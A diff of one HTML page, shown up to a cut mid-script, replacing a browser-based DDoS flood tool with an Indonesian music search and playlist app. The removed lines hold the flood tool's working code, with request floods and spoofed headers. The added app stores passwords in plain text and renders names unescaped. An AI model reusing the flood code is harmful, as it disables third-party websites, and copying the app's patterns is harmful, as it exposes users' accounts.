@@ -1,317 +1,819 @@
 <!DOCTYPE html>
-<html lang="en">
+<html lang="id">
 <head>
     <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>CYBER-AI DDoS TOOLS v3.0</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>Music Search - InuuTyzDev</title>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+    <link href="https://fonts.googleapis.com/css2?family=Orbitron:wght@500;700;900&family=Rajdhani:wght@400;500;600;700&family=Courier+Prime:wght@400;700&display=swap" rel="stylesheet">
+
     <style>
+        :root {
+            --primary-purple: #8A2BE2;
+            --secondary-purple: #4c1d95;
+            --accent-cyan: #00f3ff;
+            --glass-bg: rgba(20, 20, 30, 0.7);
+            --border-color: rgba(255, 255, 255, 0.1);
+            --sidebar-width: 280px;
+            --nav-height: 70px;
+        }
+
         * {
             margin: 0;
             padding: 0;
             box-sizing: border-box;
+            font-family: 'Rajdhani', sans-serif;
+            -webkit-tap-highlight-color: transparent;
+            outline: none;
         }
+
         body {
-            background: #0a0a0a;
-            color: #00ff41;
-            font-family: 'Courier New', monospace;
+            background-color: #050505;
+            min-height: 100vh;
+            background: radial-gradient(circle at 50% 20%, #1a0b2e 0%, #000 60%);
+            background-size: 200% 200%;
+            animation: bgPulse 10s ease infinite;
             display: flex;
             justify-content: center;
             align-items: center;
-            min-height: 100vh;
-            overflow-x: hidden;
+            overflow: hidden;
         }
-        .container {
-            background: #111;
-            border: 2px solid #00ff41;
-            padding: 30px;
-            width: 650px;
-            box-shadow: 0 0 30px #00ff4133, inset 0 0 30px #00ff4111;
-            border-radius: 5px;
+
+        @keyframes bgPulse {
+            0% { background-position: 50% 0%; }
+            50% { background-position: 50% 20%; }
+            100% { background-position: 50% 0%; }
         }
-        h1 {
-            text-align: center;
-            font-size: 22px;
-            letter-spacing: 3px;
-            text-shadow: 0 0 15px #00ff41;
-            margin-bottom: 5px;
-        }
-        .sub {
-            text-align: center;
-            font-size: 11px;
-            color: #888;
-            margin-bottom: 25px;
-            letter-spacing: 1px;
-        }
-        .input-group {
-            margin-bottom: 18px;
-        }
-        label {
-            display: block;
-            font-size: 13px;
-            margin-bottom: 6px;
-            letter-spacing: 1px;
-        }
-        input, select {
+
+        .app-container {
             width: 100%;
-            padding: 12px;
-            background: #0d0d0d;
-            border: 1px solid #00ff41;
-            color: #00ff41;
-            font-family: 'Courier New', monospace;
-            font-size: 14px;
-            outline: none;
+            height: 100dvh;
+            position: relative;
+            display: flex;
+            flex-direction: column;
+            color: white;
+            background: rgba(10, 10, 15, 0.95);
+            overflow: hidden;
         }
-        input:focus, select:focus {
-            box-shadow: 0 0 15px #00ff4166;
-            border-color: #00ff41;
+
+        @media (min-width: 768px) {
+            .app-container {
+                width: 400px;
+                height: 85vh;
+                max-height: 900px;
+                border-radius: 30px;
+                border: 1px solid rgba(255, 255, 255, 0.15);
+                box-shadow: 0 0 50px rgba(138, 43, 226, 0.3);
+            }
+            .main-content::-webkit-scrollbar { width: 5px; }
+            .main-content::-webkit-scrollbar-thumb { background: #333; border-radius: 10px; }
         }
-        select option {
-            background: #0d0d0d;
-            color: #00ff41;
+
+        @keyframes fadeInUp {
+            from { opacity: 0; transform: translateY(20px); }
+            to { opacity: 1; transform: translateY(0); }
         }
-        .btn-attack {
-            width: 100%;
-            padding: 15px;
-            background: #00ff41;
-            color: #000;
-            border: none;
-            font-family: 'Courier New', monospace;
-            font-size: 16px;
-            font-weight: bold;
-            letter-spacing: 2px;
-            cursor: pointer;
-            transition: 0.2s;
+        .anim-element {
+            opacity: 0;
+            animation: fadeInUp 0.6s cubic-bezier(0.2, 0.8, 0.2, 1) forwards;
         }
-        .btn-attack:hover {
-            background: #00cc33;
-            box-shadow: 0 0 25px #00ff41;
-        }
-        .btn-stop {
-            width: 100%;
-            padding: 12px;
-            background: #ff0040;
-            color: #fff;
-            border: none;
-            font-family: 'Courier New', monospace;
-            font-size: 14px;
-            font-weight: bold;
-            letter-spacing: 2px;
-            cursor: pointer;
-            margin-top: 10px;
-            display: none;
-        }
-        .log-box {
-            background: #050505;
-            border: 1px solid #333;
-            height: 200px;
-            margin-top: 20px;
-            padding: 12px;
-            overflow-y: auto;
-            font-size: 11px;
-            line-height: 1.6;
-        }
-        .stats {
+        .delay-1 { animation-delay: 0.1s; }
+        .delay-2 { animation-delay: 0.2s; }
+        .delay-3 { animation-delay: 0.3s; }
+
+        header {
+            height: 70px;
             display: flex;
             justify-content: space-between;
-            margin-top: 12px;
-            font-size: 12px;
+            align-items: center;
+            padding: 0 20px;
+            flex-shrink: 0;
+            z-index: 50;
+            background: rgba(0,0,0,0.2);
+            backdrop-filter: blur(5px);
+            border-bottom: 1px solid rgba(255,255,255,0.05);
         }
-        .stat {
-            background: #0d0d0d;
-            padding: 8px 15px;
-            border: 1px solid #333;
+        .header-title {
+            font-family: 'Orbitron', sans-serif;
+            font-size: 1.2rem;
+            font-weight: 800;
+            letter-spacing: 1px;
+            background: linear-gradient(to right, #fff, #a29bfe);
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
+            text-shadow: 0 0 10px rgba(138, 43, 226, 0.3);
         }
-        .stat span {
-            color: #ff0040;
-            font-weight: bold;
+        .icon-btn {
+            background: rgba(255,255,255,0.08);
+            width: 38px;
+            height: 38px;
+            border-radius: 50%;
+            border: none;
+            color: #eee;
+            font-size: 1rem;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            cursor: pointer;
+            transition: 0.3s;
+            text-decoration: none;
         }
-        ::-webkit-scrollbar { width: 6px; }
-        ::-webkit-scrollbar-track { background: #050505; }
-        ::-webkit-scrollbar-thumb { background: #00ff41; }
+        .icon-btn:active { transform: scale(0.9); background: rgba(255,255,255,0.2); }
+
+        .main-content {
+            flex: 1;
+            overflow-y: auto;
+            overflow-x: hidden;
+            padding: 20px 20px 150px 20px;
+            position: relative;
+        }
+
+        .glass-card {
+            background: rgba(30, 30, 45, 0.6);
+            backdrop-filter: blur(10px);
+            border-radius: 16px;
+            padding: 15px;
+            border: 1px solid rgba(255,255,255,0.08);
+            margin-bottom: 20px;
+            box-shadow: 0 5px 20px rgba(0,0,0,0.2);
+        }
+
+        .input-group {
+            position: relative;
+            display: flex;
+            gap: 8px;
+        }
+        .input-box {
+            flex: 1;
+            background: rgba(0, 0, 0, 0.4);
+            border: 1px solid rgba(255,255,255,0.1);
+            border-radius: 10px;
+            padding: 12px 15px;
+            color: #fff;
+            font-size: 0.95rem;
+            transition: 0.3s;
+        }
+        .input-box:focus {
+            border-color: var(--accent-cyan);
+            box-shadow: 0 0 10px rgba(0, 243, 255, 0.15);
+        }
+        .search-btn {
+            width: 48px;
+            background: var(--primary-purple);
+            border: none;
+            border-radius: 10px;
+            color: white;
+            cursor: pointer;
+            font-size: 1.1rem;
+            transition: 0.3s;
+        }
+        .search-btn:active { transform: scale(0.95); opacity: 0.8; }
+
+        .song-list { display: flex; flex-direction: column; gap: 12px; }
+        .song-item {
+            display: flex;
+            align-items: center;
+            background: rgba(255, 255, 255, 0.03);
+            border: 1px solid rgba(255, 255, 255, 0.05);
+            padding: 8px;
+            border-radius: 12px;
+            transition: 0.2s;
+            cursor: pointer;
+            position: relative;
+        }
+        .song-item:active { background: rgba(255, 255, 255, 0.08); transform: scale(0.98); }
+        .song-item.active { border-color: var(--accent-cyan); background: rgba(0, 243, 255, 0.05); }
+
+        .song-img {
+            width: 45px; height: 45px; border-radius: 8px; object-fit: cover; margin-right: 12px;
+        }
+        .song-info { flex: 1; overflow: hidden; }
+        .song-title {
+            font-weight: 700; font-size: 0.95rem; white-space: nowrap; overflow: hidden; text-overflow: ellipsis; color: #fff;
+        }
+        .song-artist {
+            font-size: 0.75rem; color: #aaa; font-family: 'Courier Prime', monospace; white-space: nowrap; overflow: hidden; text-overflow: ellipsis;
+        }
+        .song-actions { display: flex; gap: 8px; align-items: center; }
+        .song-action {
+            width: 32px; height: 32px; border-radius: 50%;
+            background: rgba(255,255,255,0.05); display: flex; align-items: center; justify-content: center;
+            color: var(--accent-cyan); font-size: 0.8rem; border: none; cursor: pointer; transition: 0.2s;
+        }
+        .song-action:hover { background: rgba(255,255,255,0.15); }
+        .add-playlist-btn {
+            color: #aaa; font-size: 1rem; display: none;
+        }
+        .logged-in .add-playlist-btn { display: flex; }
+
+        /* MINI PLAYER */
+        .mini-player {
+            position: absolute; bottom: 80px; left: 50%;
+            transform: translateX(-50%) translateY(150px);
+            width: 90%; background: rgba(20, 10, 30, 0.95); backdrop-filter: blur(15px);
+            border: 1px solid var(--primary-purple); border-radius: 50px; padding: 8px 20px 8px 8px;
+            display: flex; align-items: center; z-index: 90;
+            box-shadow: 0 5px 20px rgba(0,0,0,0.6); transition: 0.4s cubic-bezier(0.175, 0.885, 0.32, 1.275);
+            opacity: 0; visibility: hidden;
+        }
+        .mini-player.active { transform: translateX(-50%) translateY(0); opacity: 1; visibility: visible; }
+
+        .mp-img {
+            width: 42px; height: 42px; border-radius: 50%; object-fit: cover;
+            animation: spin 5s linear infinite; animation-play-state: paused; border: 2px solid var(--accent-cyan);
+        }
+        .mp-img.playing { animation-play-state: running; }
+        @keyframes spin { 100% { transform: rotate(360deg); } }
+
+        .mp-info { flex: 1; padding: 0 15px; overflow: hidden; }
+        .mp-title { font-size: 0.85rem; font-weight: 700; white-space: nowrap; overflow: hidden; text-overflow: ellipsis; }
+        .mp-artist { font-size: 0.7rem; color: var(--accent-cyan); }
+
+        .mp-controls { display: flex; gap: 15px; align-items: center; }
+        .mp-btn { background: none; border: none; color: #fff; font-size: 1.1rem; cursor: pointer; }
+        .mp-btn-main { color: var(--accent-cyan); font-size: 1.3rem; }
+        .mp-dl { color: #888; font-size: 1rem; text-decoration: none; display: flex; align-items: center; transition: 0.2s; }
+        .mp-dl:hover { color: #fff; }
+
+        /* NAVBAR (tidak digunakan karena tidak ada di body) */
+        .navbar {
+            position: absolute; bottom: 0; left: 0; width: 100%; height: var(--nav-height);
+            background: rgba(8, 8, 10, 0.98); display: flex; justify-content: space-around; align-items: center;
+            border-top: 1px solid rgba(255,255,255,0.05); z-index: 100; display: none;
+        }
+
+        /* SIDEBAR */
+        .sidebar {
+            position: absolute; top: 0; left: -100%; width: var(--sidebar-width); height: 100%;
+            background: #0b0b0b; z-index: 999; transition: left 0.3s; border-right: 1px solid #222;
+            display: flex; flex-direction: column; box-shadow: 10px 0 50px rgba(0,0,0,0.5); overflow-y: auto;
+        }
+        .sidebar.active { left: 0; }
+        .sidebar-content { padding: 20px; }
+        .sidebar-section { margin-bottom: 25px; }
+
+        .auth-tabs { display: flex; gap: 5px; margin-bottom: 15px; }
+        .auth-tab {
+            flex: 1; text-align: center; padding: 10px; background: rgba(255,255,255,0.05);
+            border-radius: 8px; cursor: pointer; font-weight: 600;
+        }
+        .auth-tab.active { background: var(--primary-purple); color: white; }
+
+        .auth-form input {
+            width: 100%; background: rgba(255,255,255,0.05); border: 1px solid rgba(255,255,255,0.1);
+            border-radius: 8px; padding: 12px; color: white; margin-bottom: 10px;
+        }
+        .auth-form button {
+            width: 100%; padding: 10px; background: var(--accent-cyan); border: none;
+            border-radius: 8px; font-weight: 700; color: #000; cursor: pointer; margin-top: 5px;
+        }
+
+        .playlist-list { margin: 10px 0; }
+        .playlist-item {
+            padding: 10px; background: rgba(255,255,255,0.03); border-radius: 8px; margin-bottom: 5px;
+            cursor: pointer; display: flex; justify-content: space-between; align-items: center;
+        }
+        .playlist-item:hover { background: rgba(255,255,255,0.06); }
+        .create-playlist { display: flex; gap: 5px; margin-top: 10px; }
+        .create-playlist input { flex: 1; background: #111; border: 1px solid #333; padding: 8px; border-radius: 8px; color: white; }
+        .create-playlist button { background: var(--primary-purple); border: none; border-radius: 8px; padding: 8px 12px; color: white; }
+
+        .logout-btn { margin-top: 20px; background: transparent; border: 1px solid #444; color: #ccc; padding: 8px 16px; border-radius: 8px; cursor: pointer; }
+
+        .overlay-backdrop {
+            position: absolute; inset: 0; background: rgba(0,0,0,0.8); backdrop-filter: blur(2px);
+            z-index: 998; opacity: 0; visibility: hidden; transition: 0.3s;
+        }
+        .overlay-backdrop.active { opacity: 1; visibility: visible; }
+
+        /* PLAYLIST MODAL */
+        .modal {
+            position: absolute; top: 50%; left: 50%; transform: translate(-50%, -50%);
+            background: #111; border: 1px solid var(--accent-cyan); border-radius: 16px; padding: 20px;
+            z-index: 2000; width: 90%; max-width: 300px; display: none; flex-direction: column; gap: 10px;
+        }
+        .modal.active { display: flex; }
+        .modal h3 { color: var(--accent-cyan); margin-bottom: 10px; }
+        .modal .playlist-option {
+            padding: 10px; background: #1a1a1a; border-radius: 8px; cursor: pointer; margin-bottom: 5px;
+        }
+        .modal input { background: #222; border: 1px solid #333; padding: 10px; border-radius: 8px; color: white; }
+        .modal-buttons { display: flex; gap: 10px; }
+        .modal-buttons button { flex: 1; padding: 8px; border-radius: 8px; border: none; cursor: pointer; }
+        .btn-create { background: var(--accent-cyan); color: black; }
+        .btn-cancel { background: #333; color: white; }
+
+        .toast {
+            position: absolute; bottom: 140px; left: 50%;
+            transform: translateX(-50%) translateY(20px);
+            background: rgba(10, 10, 15, 0.95); border: 1px solid var(--accent-cyan);
+            padding: 10px 20px; border-radius: 50px; display: flex; align-items: center; gap: 10px;
+            color: #fff; font-weight: 600; font-size: 0.9rem;
+            opacity: 0; visibility: hidden; transition: 0.3s cubic-bezier(0.175, 0.885, 0.32, 1.275);
+            z-index: 2000; width: max-content; max-width: 90%;
+        }
+        .toast.show { opacity: 1; visibility: visible; transform: translateX(-50%) translateY(0); }
+        .toast i { color: var(--accent-cyan); }
+
+        .status-msg { text-align: center; padding: 30px; color: #777; font-family: 'Courier Prime'; font-size: 0.8rem; }
+        .loading-spinner { font-size: 1.8rem; color: var(--primary-purple); animation: spin 1s infinite linear; }
+
+        .back-btn { margin-bottom: 15px; color: var(--accent-cyan); cursor: pointer; display: inline-block; }
     </style>
 </head>
 <body>
-    <div class="container">
-        <h1>⚡ CYBER-AI DDoS ⚡</h1>
-        <p class="sub">MULTI-THREAD FLOOD ENGINE v3.0</p>
-        
-        <div class="input-group">
-            <label>🎯 TARGET URL:</label>
-            <input type="text" id="target" placeholder="https://target.com/">
+
+    <div class="app-container">
+
+        <header>
+            <button class="icon-btn" onclick="toggleSidebar()"><i class="fa-solid fa-bars"></i></button>
+            <div class="header-title">Music simple InuuTyzDev</div>
+            <div style="width:38px;"></div>
+        </header>
+
+        <div class="main-content" id="main-content">
+            <div class="glass-card anim-element delay-1" id="search-card">
+                <div class="input-group">
+                    <input type="text" class="input-box" id="search-input" placeholder="Search song or artist...">
+                    <button class="search-btn" onclick="searchMusic()"><i class="fa-solid fa-search"></i></button>
+                </div>
+            </div>
+
+            <div id="loading" class="status-msg" style="display: none;">
+                <i class="fa-solid fa-circle-notch loading-spinner"></i>
+                <p style="margin-top: 10px;">Scanning frequencies...</p>
+            </div>
+
+            <div class="song-list" id="song-list">
+                <div class="status-msg anim-element delay-2">Start by searching for a song...</div>
+            </div>
         </div>
-        
-        <div class="input-group">
-            <label>🔥 THREADS:</label>
-            <select id="threads">
-                <option value="100">100 Threads - Low</option>
-                <option value="500">500 Threads - Medium</option>
-                <option value="1000" selected>1000 Threads - High</option>
-                <option value="2000">2000 Threads - Extreme</option>
-                <option value="5000">5000 Threads - MAXIMUM</option>
-            </select>
+
+        <!-- MINI PLAYER -->
+        <div class="mini-player" id="mini-player">
+            <img src="https://via.placeholder.com/50" class="mp-img" id="mp-img">
+            <div class="mp-info">
+                <div class="mp-title" id="mp-title">Select Song</div>
+                <div class="mp-artist" id="mp-artist">...</div>
+            </div>
+            <div class="mp-controls">
+                <button class="mp-btn mp-btn-main" onclick="togglePlay()">
+                    <i class="fa-solid fa-play" id="play-icon"></i>
+                </button>
+                <a href="#" class="mp-dl" id="mp-dl" download target="_blank">
+                    <i class="fa-solid fa-download"></i>
+                </a>
+            </div>
+            <audio id="audio-player" playsinline preload="auto"></audio>
         </div>
-        
-        <div class="input-group">
-            <label>⏱️ DURATION (seconds):</label>
-            <input type="number" id="duration" value="60" min="1" max="999999">
+
+        <!-- SIDEBAR -->
+        <div class="sidebar" id="mainSidebar">
+            <div class="sidebar-content" id="sidebar-content">
+                <!-- Dinamis -->
+            </div>
         </div>
-        
-        <div class="input-group">
-            <label>🌊 METHOD:</label>
-            <select id="method">
-                <option value="GET">GET Flood</option>
-                <option value="POST">POST Flood</option>
-                <option value="RANDOM">RANDOM Header Flood</option>
-            </select>
+
+        <!-- OVERLAY -->
+        <div class="overlay-backdrop" id="overlay" onclick="closeSidebar()"></div>
+
+        <!-- PLAYLIST MODAL -->
+        <div class="modal" id="playlist-modal">
+            <h3>Add to Playlist</h3>
+            <div id="playlist-options"></div>
+            <input type="text" id="new-playlist-input" placeholder="New playlist name">
+            <div class="modal-buttons">
+                <button class="btn-create" onclick="addToNewPlaylist()">Create & Add</button>
+                <button class="btn-cancel" onclick="closePlaylistModal()">Cancel</button>
+            </div>
         </div>
-        
-        <button class="btn-attack" id="attackBtn" onclick="startAttack()">💣 MULAI SERANGAN</button>
-        <button class="btn-stop" id="stopBtn" onclick="stopAttack()">🛑 STOP SERANGAN</button>
-        
-        <div class="stats">
-            <div class="stat">📤 Requests: <span id="reqCount">0</span></div>
-            <div class="stat">❌ Errors: <span id="errCount">0</span></div>
-            <div class="stat">⚡ Rate: <span id="rate">0</span>/s</div>
+
+        <div class="toast" id="toast">
+            <i class="fa-solid fa-info-circle"></i>
+            <span id="toast-msg">Message here</span>
         </div>
-        
-        <div class="log-box" id="logBox"></div>
     </div>
 
     <script>
-        let attackInterval = null;
-        let stopFlag = false;
-        let totalRequests = 0;
-        let totalErrors = 0;
-        let startTime = 0;
+        // ========== GLOBAL STATE ==========
+        let currentUser = null;
+        let pendingSong = null;
 
-        function log(msg) {
-            const logBox = document.getElementById('logBox');
-            const time = new Date().toLocaleTimeString();
-            logBox.innerHTML += `<span style="color:#666;">[${time}]</span> ${msg}<br>`;
-            logBox.scrollTop = logBox.scrollHeight;
+        // ========== UTILS ==========
+        const utils = {
+            toast: (msg) => {
+                const t = document.getElementById('toast');
+                document.getElementById('toast-msg').innerText = msg;
+                t.classList.add('show');
+                setTimeout(() => t.classList.remove('show'), 3000);
+            }
+        };
+
+        function escAttr(str) {
+            return str.replace(/'/g, "&#39;").replace(/"/g, "&quot;");
         }
 
-        function updateStats() {
-            document.getElementById('reqCount').textContent = totalRequests;
-            document.getElementById('errCount').textContent = totalErrors;
-            const elapsed = (Date.now() - startTime) / 1000;
-            const rate = elapsed > 0 ? Math.floor(totalRequests / elapsed) : 0;
-            document.getElementById('rate').textContent = rate;
+        // ========== PLAYER VARIABLES & MEDIA SESSION ==========
+        const audio = document.getElementById('audio-player');
+        const mpImg = document.getElementById('mp-img');
+        const playIcon = document.getElementById('play-icon');
+        const miniPlayer = document.getElementById('mini-player');
+
+        function setupMediaSession() {
+            if (!('mediaSession' in navigator)) return;
+            navigator.mediaSession.setActionHandler('play', () => {
+                audio.play().catch(e => console.log('MediaSession play error:', e));
+                updatePlaybackState(true);
+            });
+            navigator.mediaSession.setActionHandler('pause', () => {
+                audio.pause();
+                updatePlaybackState(false);
+            });
+            audio.addEventListener('ended', () => updatePlaybackState(false));
         }
 
-        async function floodGET(target) {
-            try {
-                await fetch(target + '?' + Math.random(), {
-                    mode: 'no-cors',
-                    cache: 'no-store'
-                });
-                totalRequests++;
-                return true;
-            } catch(e) {
-                totalErrors++;
-                return false;
+        function updateMediaMetadata(title, artist, artwork) {
+            if (!('mediaSession' in navigator)) return;
+            navigator.mediaSession.metadata = new MediaMetadata({
+                title, artist, album: 'Music Player',
+                artwork: [{ src: artwork, sizes: '300x300', type: 'image/jpeg' }]
+            });
+        }
+
+        function updatePlaybackState(isPlaying) {
+            if (!('mediaSession' in navigator)) return;
+            navigator.mediaSession.playbackState = isPlaying ? 'playing' : 'paused';
+        }
+
+        function playSong(url, title, artist, img) {
+            if (!url) return utils.toast("Audio preview not available");
+            audio.src = url; audio.load();
+            document.getElementById('mp-title').innerText = title;
+            document.getElementById('mp-artist').innerText = artist;
+            document.getElementById('mp-img').src = img;
+            document.getElementById('mp-dl').href = url;
+            miniPlayer.classList.add('active');
+            mpImg.classList.add('playing');
+            playIcon.className = "fa-solid fa-pause";
+            updateMediaMetadata(title, artist, img);
+            audio.play().then(() => updatePlaybackState(true)).catch(() => {
+                updatePlaybackState(false);
+                mpImg.classList.remove('playing');
+                playIcon.className = "fa-solid fa-play";
+            });
+        }
+
+        function togglePlay() {
+            if (audio.paused) {
+                if (audio.src) {
+                    audio.play().then(() => {
+                        playIcon.className = "fa-solid fa-pause";
+                        mpImg.classList.add('playing');
+                        updatePlaybackState(true);
+                    }).catch(e => console.log(e));
+                }
+            } else {
+                audio.pause();
+                playIcon.className = "fa-solid fa-play";
+                mpImg.classList.remove('playing');
+                updatePlaybackState(false);
             }
         }
 
-        async function floodPOST(target) {
-            try {
-                await fetch(target, {
-                    method: 'POST',
-                    mode: 'no-cors',
-                    cache: 'no-store',
-                    headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
-                    body: 'data=' + Math.random().toString(36).repeat(500)
-                });
-                totalRequests++;
-                return true;
-            } catch(e) {
-                totalErrors++;
-                return false;
+        audio.addEventListener('ended', () => {
+            playIcon.className = "fa-solid fa-play";
+            mpImg.classList.remove('playing');
+            updatePlaybackState(false);
+        });
+
+        // ========== AUTH & USER MANAGEMENT ==========
+        function getUsers() {
+            const data = localStorage.getItem('musicUsers');
+            return data ? JSON.parse(data) : [];
+        }
+        function saveUsers(users) {
+            localStorage.setItem('musicUsers', JSON.stringify(users));
+        }
+        function getCurrentUserPlaylists() {
+            const users = getUsers();
+            const user = users.find(u => u.username === currentUser);
+            if (user && user.playlists) return user.playlists;
+            return {};
+        }
+        function saveCurrentUserPlaylists(playlists) {
+            const users = getUsers();
+            const user = users.find(u => u.username === currentUser);
+            if (user) {
+                user.playlists = playlists;
+                saveUsers(users);
             }
         }
 
-        async function floodRANDOM(target) {
-            const methods = ['GET', 'POST', 'HEAD', 'PUT'];
-            const randMethod = methods[Math.floor(Math.random() * methods.length)];
-            try {
-                await fetch(target + '?' + Math.random(), {
-                    method: randMethod,
-                    mode: 'no-cors',
-                    cache: 'no-store',
-                    headers: {
-                        'X-Forwarded-For': Math.floor(Math.random()*255)+'.'+Math.floor(Math.random()*255)+'.'+Math.floor(Math.random()*255)+'.'+Math.floor(Math.random()*255),
-                        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
-                    }
-                });
-                totalRequests++;
-                return true;
-            } catch(e) {
-                totalErrors++;
-                return false;
+        function register(username, password) {
+            const users = getUsers();
+            if (users.find(u => u.username === username)) {
+                return utils.toast('Username already exists');
+            }
+            users.push({ username, password, playlists: {} });
+            saveUsers(users);
+            loginUser(username);
+            utils.toast('Registered & logged in');
+        }
+
+        function login(username, password) {
+            const users = getUsers();
+            const user = users.find(u => u.username === username && u.password === password);
+            if (!user) return utils.toast('Invalid credentials');
+            loginUser(username);
+        }
+
+        function loginUser(username) {
+            currentUser = username;
+            sessionStorage.setItem('currentUser', username);
+            updateUIForAuth();
+            closeSidebar();
+        }
+
+        function logout() {
+            currentUser = null;
+            sessionStorage.removeItem('currentUser');
+            updateUIForAuth();
+            document.getElementById('song-list').innerHTML = '<div class="status-msg anim-element delay-2">Start by searching for a song...</div>';
+            document.getElementById('search-card').style.display = 'block';
+            closeSidebar();
+        }
+
+        function updateUIForAuth() {
+            const appContainer = document.querySelector('.app-container');
+            if (currentUser) {
+                appContainer.classList.add('logged-in');
+            } else {
+                appContainer.classList.remove('logged-in');
+            }
+            updateSidebarUI();
+        }
+
+        // ========== SIDEBAR ==========
+        function toggleSidebar() {
+            const sidebar = document.getElementById('mainSidebar');
+            const overlay = document.getElementById('overlay');
+            if (!sidebar.classList.contains('active')) {
+                updateSidebarUI(); // refresh sebelum dibuka
+            }
+            sidebar.classList.toggle('active');
+            overlay.classList.toggle('active');
+        }
+
+        function closeSidebar() {
+            document.getElementById('mainSidebar').classList.remove('active');
+            document.getElementById('overlay').classList.remove('active');
+        }
+
+        function updateSidebarUI() {
+            const sidebar = document.getElementById('sidebar-content');
+            if (!currentUser) {
+                sidebar.innerHTML = `
+                    <div class="sidebar-section">
+                        <div class="auth-tabs">
+                            <div class="auth-tab active" id="tab-login" onclick="switchAuthTab('login')">Login</div>
+                            <div class="auth-tab" id="tab-register" onclick="switchAuthTab('register')">Register</div>
+                        </div>
+                        <div id="auth-forms">
+                            <div class="auth-form" id="form-login">
+                                <input type="text" id="login-username" placeholder="Username">
+                                <input type="password" id="login-password" placeholder="Password">
+                                <button onclick="handleLogin()">Login</button>
+                            </div>
+                            <div class="auth-form" id="form-register" style="display:none;">
+                                <input type="text" id="reg-username" placeholder="Username">
+                                <input type="password" id="reg-password" placeholder="Password">
+                                <button onclick="handleRegister()">Register</button>
+                            </div>
+                        </div>
+                    </div>
+                `;
+            } else {
+                const playlists = getCurrentUserPlaylists();
+                const playlistNames = Object.keys(playlists);
+                let playlistHTML = '';
+                if (playlistNames.length === 0) {
+                    playlistHTML = '<div style="color:#666; font-size:0.9rem;">No playlists yet</div>';
+                } else {
+                    playlistNames.forEach(name => {
+                        playlistHTML += `
+                            <div class="playlist-item">
+                                <span onclick="showPlaylist('${name}')">${name}</span>
+                                <span style="color:#888; font-size:0.8rem;">${playlists[name].length} songs</span>
+                            </div>`;
+                    });
+                }
+                sidebar.innerHTML = `
+                    <div class="sidebar-section">
+                        <div style="font-weight:700; font-size:1.1rem; margin-bottom:10px;">👤 ${currentUser}</div>
+                        <div style="font-size:0.85rem; color:#aaa; margin-bottom:15px;">Your Playlists</div>
+                        <div class="playlist-list">${playlistHTML}</div>
+                        <div class="create-playlist">
+                            <input type="text" id="sidebar-new-playlist" placeholder="New playlist">
+                            <button onclick="createPlaylistFromSidebar()">+</button>
+                        </div>
+                        <button class="logout-btn" onclick="logout()">Logout</button>
+                    </div>
+                `;
             }
         }
 
-        function startAttack() {
-            const target = document.getElementById('target').value.trim();
-            if (!target) {
-                log('❌ MASUKIN TARGET DULU GOBLOK!');
+        function switchAuthTab(tab) {
+            document.getElementById('tab-login').classList.toggle('active', tab === 'login');
+            document.getElementById('tab-register').classList.toggle('active', tab === 'register');
+            document.getElementById('form-login').style.display = tab === 'login' ? 'block' : 'none';
+            document.getElementById('form-register').style.display = tab === 'register' ? 'block' : 'none';
+        }
+
+        function handleLogin() {
+            const u = document.getElementById('login-username').value.trim();
+            const p = document.getElementById('login-password').value.trim();
+            if (!u || !p) return utils.toast('Fill all fields');
+            login(u, p);
+        }
+
+        function handleRegister() {
+            const u = document.getElementById('reg-username').value.trim();
+            const p = document.getElementById('reg-password').value.trim();
+            if (!u || !p) return utils.toast('Fill all fields');
+            register(u, p);
+        }
+
+        function createPlaylistFromSidebar() {
+            const nameInput = document.getElementById('sidebar-new-playlist');
+            const name = nameInput.value.trim();
+            if (!name) return utils.toast('Enter playlist name');
+            const playlists = getCurrentUserPlaylists();
+            if (playlists[name]) return utils.toast('Playlist already exists');
+            playlists[name] = [];
+            saveCurrentUserPlaylists(playlists);
+            nameInput.value = '';
+            updateSidebarUI();
+            utils.toast(`Playlist "${name}" created`);
+        }
+
+        function showPlaylist(name) {
+            const playlists = getCurrentUserPlaylists();
+            const songs = playlists[name] || [];
+            const mainContent = document.getElementById('song-list');
+            document.getElementById('search-card').style.display = 'none';
+            let html = `
+                <div class="back-btn" onclick="goBackToSearch()"><i class="fa-solid fa-arrow-left"></i> Back to search</div>
+                <h3 style="margin-bottom:15px;">${name} (${songs.length} songs)</h3>`;
+            if (songs.length === 0) {
+                html += '<div class="status-msg">Playlist is empty</div>';
+            } else {
+                songs.forEach((song, idx) => {
+                    const safeTitle = escAttr(song.title);
+                    const safeArtist = escAttr(song.artist);
+                    const preview = song.previewUrl || '';
+                    const onClick = preview
+                        ? `playSong('${preview}','${safeTitle}','${safeArtist}','${song.artwork}')`
+                        : `utils.toast('No preview available')`;
+                    html += `
+                        <div class="song-item" style="pointer-events: auto;">
+                            <img src="${song.artwork}" class="song-img" onclick="${onClick}">
+                            <div class="song-info" onclick="${onClick}">
+                                <div class="song-title">${song.title}</div>
+                                <div class="song-artist">${song.artist}</div>
+                            </div>
+                            <button class="song-action" style="color:#ff5555;" onclick="removeFromPlaylist('${name}',${idx})">
+                                <i class="fa-solid fa-trash"></i>
+                            </button>
+                        </div>`;
+                });
+            }
+            mainContent.innerHTML = html;
+        }
+
+        function goBackToSearch() {
+            document.getElementById('search-card').style.display = 'block';
+            document.getElementById('song-list').innerHTML = '<div class="status-msg anim-element delay-2">Start by searching for a song...</div>';
+        }
+
+        function removeFromPlaylist(playlistName, index) {
+            const playlists = getCurrentUserPlaylists();
+            if (!playlists[playlistName]) return;
+            playlists[playlistName].splice(index, 1);
+            saveCurrentUserPlaylists(playlists);
+            showPlaylist(playlistName);
+        }
+
+        // ========== PLAYLIST MODAL ==========
+        function openPlaylistModal(song) {
+            pendingSong = song;
+            const modal = document.getElementById('playlist-modal');
+            const optionsDiv = document.getElementById('playlist-options');
+            const playlists = getCurrentUserPlaylists();
+            const names = Object.keys(playlists);
+            if (names.length === 0) {
+                optionsDiv.innerHTML = '<div style="color:#666;">No playlists yet. Create one below.</div>';
+            } else {
+                optionsDiv.innerHTML = names.map(name => `
+                    <div class="playlist-option" onclick="addToExistingPlaylist('${name}')">${name} (${playlists[name].length})</div>
+                `).join('');
+            }
